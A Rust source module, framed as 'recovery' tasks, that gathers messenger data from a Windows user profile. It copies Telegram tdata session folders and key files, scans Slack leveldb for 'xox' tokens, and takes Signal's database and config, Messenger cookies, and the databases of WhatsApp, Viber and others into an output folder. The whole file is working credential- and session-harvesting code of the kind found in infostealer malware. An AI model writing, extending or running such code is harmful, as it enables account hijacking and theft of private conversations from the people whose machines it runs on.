use crate::recovery::{
    context::RecoveryContext,
    fs::{copy_dir_limited, sanitize_label},
    jabber,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use regex::Regex;
use std::ffi::OsStr;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::{fs, io::AsyncReadExt, task};
use walkdir::WalkDir;

const WHATSAPP_FILE_LIMIT: u64 = 10 * 1024 * 1024;

pub fn messenger_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();
    tasks.push(Arc::new(ElementTask));
    tasks.push(Arc::new(FacebookMessengerTask));
    tasks.push(Arc::new(IcqTask));
    tasks.push(Arc::new(SignalTask));
    tasks.push(Arc::new(SlackTask));
    tasks.push(Arc::new(SkypeTask));
    tasks.push(Arc::new(TelegramTask));
    tasks.push(Arc::new(ToxTask));
    tasks.push(Arc::new(ViberTask));
    tasks.push(Arc::new(WhatsAppTask));
    tasks.extend(jabber::jabber_tasks(ctx));
    tasks
}

struct ElementTask;

#[async_trait]
impl RecoveryTask for ElementTask {
    fn label(&self) -> String {
        "Element Client".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let base = ctx.roaming_data_dir.join("Element");
        let dest_root = messenger_output_dir(ctx, &self.label()).await?;

        copy_named_dir(
            &self.label(),
            &base.join("IndexedDB"),
            &dest_root.join("IndexedDB"),
            &mut artifacts,
        )
        .await?;
        copy_named_dir(
            &self.label(),
            &base.join("Local Storage"),
            &dest_root.join("Local Storage"),
            &mut artifacts,
        )
        .await?;

        Ok(artifacts)
    }
}

struct FacebookMessengerTask;

#[async_trait]
impl RecoveryTask for FacebookMessengerTask {
    fn label(&self) -> String {
        "Facebook Messenger".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let base = ctx.roaming_data_dir.join("Messenger");
        let dest_root = messenger_output_dir(ctx, &self.label()).await?;

        copy_named_dir(
            &self.label(),
            &base.join("Local Storage"),
            &dest_root.join("Local Storage"),
            &mut artifacts,
        )
        .await?;

        copy_named_dir(
            &self.label(),
            &base.join("Session Storage"),
            &dest_root.join("Session Storage"),
            &mut artifacts,
        )
        .await?;

        if base.join("Network").exists() {
            copy_named_dir(
                &self.label(),
                &base.join("Network"),
                &dest_root.join("Network"),
                &mut artifacts,
            )
            .await?;
        } else {
            copy_named_file(
                &self.label(),
                &base.join("Cookies"),
                &dest_root,
                &mut artifacts,
            )
            .await?;
        }

        copy_named_file(
            &self.label(),
            &base.join("Preferences"),
            &dest_root,
            &mut artifacts,
        )
        .await?;

        Ok(artifacts)
    }
}

struct IcqTask;

#[async_trait]
impl RecoveryTask for IcqTask {
    fn label(&self) -> String {
        "ICQ".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let source = ctx.roaming_data_dir.join("ICQ").join("0001");
        let dest_root = messenger_output_dir(ctx, &self.label()).await?;

        copy_named_dir(
            &self.label(),
            &source,
            &dest_root.join("0001"),
            &mut artifacts,
        )
        .await?;
        Ok(artifacts)
    }
}

struct SignalTask;

#[async_trait]
impl RecoveryTask for SignalTask {
    fn label(&self) -> String {
        "Signal".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let base = ctx.roaming_data_dir.join("Signal");
        let dest_root = messenger_output_dir(ctx, &self.label()).await?;

        copy_named_dir(
            &self.label(),
            &base.join("sql"),
            &dest_root.join("sql"),
            &mut artifacts,
        )
        .await?;
        copy_named_dir(
            &self.label(),
            &base.join("attachments.noindex"),
            &dest_root.join("attachments.noindex"),
            &mut artifacts,
        )
        .await?;
        copy_named_file(
            &self.label(),
            &base.join("config.json"),
            &dest_root,
            &mut artifacts,
        )
        .await?;

        Ok(artifacts)
    }
}

struct SlackTask;

#[async_trait]
impl RecoveryTask for SlackTask {
    fn label(&self) -> String {
        "Slack Tokens".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let source = ctx
            .roaming_data_dir
            .join("Slack")
            .join("Local Storage")
            .join("leveldb");
        if let Ok(mut dir) = fs::read_dir(&source).await {
            let dest_root = messenger_output_dir(ctx, &self.label()).await?;
            while let Some(entry) = dir.next_entry().await? {
                let path = entry.path();
                if !entry.file_type().await?.is_file() {
                    continue;
                }

                if file_contains_pattern(&path, b"xox").await? {
                    copy_named_file(&&self.label(), &path, &dest_root, &mut artifacts).await?;
                }
            }
        }

        Ok(artifacts)
    }
}

struct SkypeTask;

#[async_trait]
impl RecoveryTask for SkypeTask {
    fn label(&self) -> String {
        "Skype".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let source = ctx
            .roaming_data_dir
            .join("Microsoft")
            .join("Skype for Desktop")
            .join("Local Storage");
        let dest_root = messenger_output_dir(ctx, &self.label()).await?;
        copy_named_dir(
            &self.label(),
            &source,
            &dest_root.join("Local Storage"),
            &mut artifacts,
        )
        .await?;

        Ok(artifacts)
    }
}

struct TelegramTask;

#[async_trait]
impl RecoveryTask for TelegramTask {
    fn label(&self) -> String {
        "Telegram tdata".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let roots = [
            ctx.local_data_dir.join("Telegram Desktop").join("tdata"),
            ctx.roaming_data_dir.join("Telegram Desktop").join("tdata"),
            ctx.roaming_data_dir
                .join("Low")
                .join("Telegram Desktop")
                .join("tdata"),
        ];

        let dest_root = messenger_output_dir(ctx, &self.label()).await?;
        let map_regex = Regex::new(r"^map[0-9]+$").unwrap();
        let session_folder_regex = Regex::new(r"^[A-F0-9]{16}$").unwrap();

        let excluded_folders = [
            "user_data",
            "emoji",
            "temp",
            "dumps",
            "working",
            "thumbnails",
        ];

        for root in &roots {
            if let Ok(mut dir) = fs::read_dir(root).await {
                while let Some(entry) = dir.next_entry().await? {
                    let file_name = entry.file_name();
                    let name = file_name.to_string_lossy();
                    let is_file = entry.file_type().await?.is_file();
                    let is_dir = entry.file_type().await?.is_dir();

                    if is_dir {
                        if session_folder_regex.is_match(&name) {
                            copy_telegram_session_dir(
                                &self.label(),
                                &entry.path(),
                                &dest_root.join(name.to_string()),
                                &excluded_folders,
                                &mut artifacts,
                            )
                            .await?;
                        }
                    } else if is_file {
                        let should_copy = name.len() == 17
                            || name == "key_datas"
                            || name == "prefix"
                            || map_regex.is_match(&name);

                        if should_copy {
                            copy_named_file(
                                &self.label(),
                                &entry.path(),
                                &dest_root,
                                &mut artifacts,
                            )
                            .await?;
                        }
                    }
                }
            }
        }

        Ok(artifacts)
    }
}

async fn copy_telegram_session_dir(
    label: &str,
    src: &Path,
    dst: &Path,
    excluded: &[&str],
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    fs::create_dir_all(dst).await?;
    let mut dir = fs::read_dir(src).await?;
    while let Some(entry) = dir.next_entry().await? {
        let fname = entry.file_name().to_string_lossy().to_string();
        if excluded.iter().any(|&ex| fname.eq_ignore_ascii_case(ex)) {
            continue;
        }

        let path = entry.path();
        if entry.file_type().await?.is_dir() {
            copy_dir_limited(&path, &dst.join(&fname), label, artifacts, 2, 100).await?;
        } else {
            let target = dst.join(&fname);
            if let Ok(_) = fs::copy(&path, &target).await {
                let meta = fs::metadata(&target).await?;
                artifacts.push(RecoveryArtifact {
                    label: label.to_string(),
                    path: target,
                    size_bytes: meta.len(),
                    modified: meta.modified().ok(),
                });
            }
        }
    }
    Ok(())
}

struct ToxTask;

#[async_trait]
impl RecoveryTask for ToxTask {
    fn label(&self) -> String {
        "Tox".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let source = ctx.roaming_data_dir.join("Tox");
        let dest_root = messenger_output_dir(ctx, &self.label()).await?;

        copy_named_dir(&&self.label(), &source, &dest_root, &mut artifacts).await?;
        Ok(artifacts)
    }
}

struct ViberTask;

#[async_trait]
impl RecoveryTask for ViberTask {
    fn label(&self) -> String {
        "Viber".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let source = ctx.roaming_data_dir.join("ViberPC");
        let dest_root = messenger_output_dir(ctx, &self.label()).await?;

        let pattern = Regex::new(r"^([\+|0-9][0-9.]{1,12})$").unwrap();
        if let Ok(mut dir) = fs::read_dir(&source).await {
            while let Some(entry) = dir.next_entry().await? {
                let path = entry.path();
                if entry.file_type().await?.is_dir() {
                    if pattern.is_match(&entry.file_name().to_string_lossy()) {
                        copy_named_dir(
                            &self.label(),
                            &path,
                            &dest_root.join(entry.file_name()),
                            &mut artifacts,
                        )
                        .await?;
                        copy_files_with_extensions(
                            &self.label(),
                            &path,
                            &dest_root.join(entry.file_name()),
                            &[".db", ".db-wal"],
                            None,
                            &mut artifacts,
                        )
                        .await?;
                    }
                } else if entry.file_type().await?.is_file() {
                    if matches_extension(&entry.path(), &[".db", ".db-wal"]) {
                        copy_named_file(&&self.label(), &path, &dest_root, &mut artifacts).await?;
                    }
                }
            }
        }

        Ok(artifacts)
    }
}

struct WhatsAppTask;

#[async_trait]
impl RecoveryTask for WhatsAppTask {
    fn label(&self) -> String {
        "WhatsApp Desktop".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let packages_dir = ctx.local_data_dir.join("Packages");
        if !packages_dir.exists() {
            return Ok(artifacts);
        }

        let pattern = Regex::new(r"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$").unwrap();
        let local_states =
            find_whatsapp_local_states(packages_dir.clone(), pattern.clone()).await?;

        let dest_root = messenger_output_dir(ctx, &self.label()).await?;

        for local_state in local_states {
            let state_label = describe_path(&local_state);
            copy_files_with_extensions(
                &self.label(),
                &local_state,
                &dest_root.join(&state_label),
                &[".db", ".db-wal", ".dat"],
                Some(WHATSAPP_FILE_LIMIT),
                &mut artifacts,
            )
            .await?;

            let profile_dirs = find_profile_pictures(local_state.clone()).await?;
            for profile_dir in profile_dirs {
                copy_named_dir(
                    &self.label(),
                    &profile_dir,
                    &dest_root.join(describe_path(&profile_dir)),
                    &mut artifacts,
                )
                .await?;
            }
        }

        Ok(artifacts)
    }
}

pub(crate) async fn messenger_output_dir(
    ctx: &RecoveryContext,
    label: &str,
) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("Messengers")
        .join(sanitize_label(label));
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}

async fn copy_named_dir(
    label: &str,
    src: &Path,
    dst: &Path,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<bool, RecoveryError> {
    match fs::metadata(src).await {
        Ok(meta) if meta.is_dir() => {
            copy_dir_limited(src, dst, label, artifacts, usize::MAX, 0).await?;
            Ok(true)
        }
        _ => Ok(false),
    }
}

async fn copy_named_file(
    label: &str,
    file: &Path,
    dest_root: &Path,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    if !file.exists() {
        return Ok(());
    }

    fs::create_dir_all(dest_root).await?;
    let file_name = file
        .file_name()
        .unwrap_or_else(|| OsStr::new("file"))
        .to_os_string();
    let destination = dest_root.join(file_name);
    fs::copy(file, &destination).await?;
    let meta = fs::metadata(&destination).await?;
    artifacts.push(RecoveryArtifact {
        label: label.to_string(),
        path: destination,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    });
    Ok(())
}

async fn copy_files_with_extensions(
    label: &str,
    source: &Path,
    dest_root: &Path,
    extensions: &[&str],
    max_size: Option<u64>,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    if !source.exists() {
        return Ok(());
    }

    fs::create_dir_all(dest_root).await?;
    let mut dir = fs::read_dir(source).await?;
    while let Some(entry) = dir.next_entry().await? {
        if !entry.file_type().await?.is_file() {
            continue;
        }

        if matches_extension(&entry.path(), extensions) {
            let metadata = entry.metadata().await?;
            if let Some(limit) = max_size {
                if metadata.len() > limit {
                    continue;
                }
            }
            copy_named_file(label, &entry.path(), dest_root, artifacts).await?;
        }
    }

    Ok(())
}

fn matches_extension(path: &Path, extensions: &[&str]) -> bool {
    path.extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| {
            extensions
                .iter()
                .any(|allowed| ext.eq_ignore_ascii_case(allowed.trim_start_matches('.')))
        })
        .unwrap_or(false)
}

async fn file_contains_pattern(path: &Path, needle: &[u8]) -> Result<bool, RecoveryError> {
    let mut file = fs::File::open(path).await?;
    let mut buffer = [0u8; 8192];
    let mut overlap = Vec::new();

    loop {
        let read = file.read(&mut buffer).await?;
        if read == 0 {
            break;
        }

        overlap.extend_from_slice(&buffer[..read]);
        if overlap.windows(needle.len()).any(|window| window == needle) {
            return Ok(true);
        }

        if overlap.len() > needle.len() {
            let to_drain = overlap.len() - needle.len();
            overlap.drain(0..to_drain);
        }
    }

    Ok(false)
}

async fn find_whatsapp_local_states(
    packages_dir: PathBuf,
    pattern: Regex,
) -> Result<Vec<PathBuf>, RecoveryError> {
    task::spawn_blocking(move || collect_localstate_dirs(&packages_dir, &pattern))
        .await
        .map_err(|err| RecoveryError::Custom(format!("whatsapp scan interrupted: {err}")))
}

fn collect_localstate_dirs(base: &Path, pattern: &Regex) -> Vec<PathBuf> {
    let mut results = Vec::new();

    let entries = match std::fs::read_dir(base) {
        Ok(entries) => entries,
        Err(_) => return results,
    };

    for entry in entries.filter_map(Result::ok) {
        if entry.file_type().map(|ft| ft.is_dir()).unwrap_or(false) {
            let folder_name = entry.file_name().to_string_lossy().to_lowercase();
            if pattern.is_match(&folder_name) {
                for walker in WalkDir::new(entry.path())
                    .into_iter()
                    .filter_map(Result::ok)
                    .filter(|walk| {
                        walk.file_type().is_dir()
                            && walk.file_name().eq_ignore_ascii_case("LocalState")
                    })
                {
                    results.push(walker.into_path());
                }
            }
        }
    }

    results
}

async fn find_profile_pictures(local_state: PathBuf) -> Result<Vec<PathBuf>, RecoveryError> {
    task::spawn_blocking(move || {
        WalkDir::new(local_state)
            .into_iter()
            .filter_map(Result::ok)
            .filter(|entry| {
                entry.file_type().is_dir()
                    && entry.file_name().eq_ignore_ascii_case("profilePictures")
            })
            .map(|entry| entry.into_path())
            .collect::<Vec<_>>()
    })
    .await
    .map_err(|err| RecoveryError::Custom(format!("profile scan interrupted: {err}")))
}

fn describe_path(path: &Path) -> String {
    sanitize_label(&path.display().to_string())
}
